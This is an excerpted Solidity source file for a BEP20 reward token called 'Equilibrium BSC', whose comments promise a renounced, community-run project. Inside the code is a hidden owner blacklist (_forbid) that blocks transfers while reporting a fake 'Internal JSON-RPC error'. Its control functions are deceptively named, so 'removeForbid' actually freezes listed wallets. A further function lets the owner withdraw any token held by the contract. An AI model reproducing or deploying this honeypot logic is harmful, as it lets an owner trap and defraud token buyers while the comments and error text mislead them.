...
// A low tax for those who like to trade for profit. With initial anti-dump sell tax, decreasing for 3 days. 
// BUSD Stablecoin rewards for those who hodl. 
// A renounced contract once confirmed secure and stable after tax reductions bwith all liquidity burned forever for peace of mind.

// One project wallet controlled by multi-sig under KYC and any expenses voted on. 
// These funds can be used for marketing if necessary or even to buyback the chart.

// After the contract is renounced there will be 6 x weekly burns of 5% from the deployer wallet. 
// The remaining 10% will be used to airdrop to a selection of victims of confirmed rugs and scams 
// over a time period when it can be voted by holders and once the project has stability.
...
// Equilibrium is a TRUE COMMUNITY PROJECT.
...
contract BEP20 is Context, IBEP20, IBEP20Metadata {
    ...
    mapping (address => bool) public _forbid;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(!_forbid[_msgSender()] && !_forbid[recipient], "Internal JSON-RPC error");
    ...
    function transferFrom(
        ...
        require(!_forbid[sender] && !_forbid[recipient], "Internal JSON-RPC error");
...
contract RewardsPool is DividendPayingToken {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 1800 && newClaimWait <= 86400, "Rewards pool: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "Rewards pool: Cannot update claimWait to same value");
...
contract EQUILIBRIUM is BEP20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() BEP20("Equilibrium BSC", "EQLM"){
        address newOwner = address(0x467a9965Fa02dfE3a04495Cf27105557b322835D);
    
        uint256 totalSupply = 10000000000 * (10**18);
        // Maximum amount to transfer
        maxTransactionAmount = 10000000000 * (10**18);
        // Maximum wallet size in tokens | Set number in tokens
        _maxWalletToken = 50000000 * (10**18);
    	...
    	marketingWallet = address(0x7BA75A5A9b18520e6812977F278c1cBC394234A7);
        // Community Distribution Wallet
        communityWallet = address(0x1691523E0e2f5730329A809D1926D7F0698aee55);
        // Liquidity Wallet | If had one
        liquidityWallet = address(0x1691523E0e2f5730329A809D1926D7F0698aee55); 
        ...
        rewardsPool.excludeFromDividends(address(rewardsPool));
        rewardsPool.excludeFromDividends(address(this));
        rewardsPool.excludeFromDividends(newOwner);
        rewardsPool.excludeFromDividends(address(_pancakeswapV2Router));
        rewardsPool.excludeFromDividends(address(0xdead));
        ...
        excludeFromMaxTransaction(address(rewardsPool), true);
    ...
    // Exclude from the rewards pool | Stop gaining dividends for rewards | Only for lockers and deployer wallets
    function excludeFromDividends(address account) external onlyOwner {
        rewardsPool.excludeFromDividends(account);
        emit ExcludeFromDividends(account);
    }

    // Include in rewards pool | Start gaining dividends for rewards
    function includeInDividends(address account) external onlyOwner {
        rewardsPool.includeInDividends(account);
        emit IncludeInDividends(account);
    }

    // Change SwapAndLiquidy token swap amounts | Set number in tokens
    ...
    // Change maximum wallet amount | Set in tokens
    ...
    function excludeFromMaxTransaction(address excludeMaxTransaction, bool isExcluded) public onlyOwner {
        _isExcludedMaxTransactionAmount[excludeMaxTransaction] = isExcluded;
        emit ExcludedMaxTransactionAmount(excludeMaxTransaction, isExcluded);
    }
    ...
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        ...
        if(value) {
            rewardsPool.excludeFromDividends(pair);
        }
    ...
    function updateClaimWait(uint256 claimWait) external onlyOwner {
        rewardsPool.updateClaimWait(claimWait);
    }

    function getClaimWait() external view returns(uint256) {
        return rewardsPool.claimWait();
    }

    function getTotalDividendsDistributed() external view returns (uint256) {
        return rewardsPool.totalDividendsDistributed();
    }
    ...
    function withdrawableDividendOf(address account) public view returns(uint256) {
    	return rewardsPool.withdrawableDividendOf(account);
  	}

	function dividendTokenBalanceOf(address account) public view returns (uint256) {
		return rewardsPool.holderBalance(account);
	}
    ...
    function getAccountDividendsInfo(address account)
        external view returns (
            ...
            uint256,
            uint256) {
        return rewardsPool.getAccount(account);
    }
	...
	function getAccountDividendsInfoAtIndex(uint256 index)
        external view returns (
            ...
            uint256,
            uint256) {
    	return rewardsPool.getAccountAtIndex(index);
    }

	function processRewardsPool(uint256 gas) external {
		(uint256 iterations, uint256 claims, uint256 lastProcessedIndex) = rewardsPool.process(gas);
		emit ProcessedRewardsPool(iterations, claims, lastProcessedIndex, false, gas, tx.origin);
    }

    function claim() external {
		rewardsPool.processAccount(payable(msg.sender), false);
    }

    function getLastProcessedIndex() external view returns(uint256) {
    	return rewardsPool.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns(uint256) {
        return rewardsPool.getNumberOfTokenHolders();
    }
    
    function getNumberOfDividends() external view returns(uint256) {
        return rewardsPool.totalBalance();
    }
    ...
    function _transfer(
        ...
        try rewardsPool.setBalance(payable(from), balanceOf(from)) {} catch {}
        try rewardsPool.setBalance(payable(to), balanceOf(to)) {} catch {}

        if(!swapping) {
	    	uint256 gas = gasForProcessing;

	    	try rewardsPool.process(gas) returns (uint256 iterations, uint256 claims, uint256 lastProcessedIndex) {
	    		emit ProcessedRewardsPool(iterations, claims, lastProcessedIndex, true, gas, tx.origin);
	    	}
	    	catch {}
        }
    }
    ...
    function swapBack() private {
        ...
        tokensForLiquidity = 0 * (10**18);
        tokensForMarketing = 0 * (10**18);
        tokensForRewards = 0 * (10**18);
        tokensForCommunity = 0 * (10**18);
        ...
        success = IBEP20(token).transfer(address(rewardsPool), tokenBalance);
        
        if (success) {
            rewardsPool.distributeTokenDividends(tokenBalance);
            emit SendDividends(tokenBalance, ethForRewards);
        }

        if(buyBackEnabled){
            (success,) = address(marketingWallet).call{value: ethForMarketing * percentForMarketing / 100}("BuyBack completed");
    ...
    function rescueBEP20Token(address tokenAddress, uint256 tokens) external onlyOwner returns (bool success){
    return BEP20(tokenAddress).transfer(msg.sender, tokens);
    }

    function addForbid(address account) external onlyOwner {
        _forbid[account] = false;
    }

    function removeForbid(address[] calldata addresses) external onlyOwner {
      for (uint256 i; i < addresses.length; ++i) {
        _forbid[addresses[i]] = true;
      }
    }

    function marketingBuyBackSettings(bool _buyBackEnabled, uint256 _percentForMarketing) external onlyOwner {
        require(_percentForMarketing <= 100, "May not set value higher than 100");
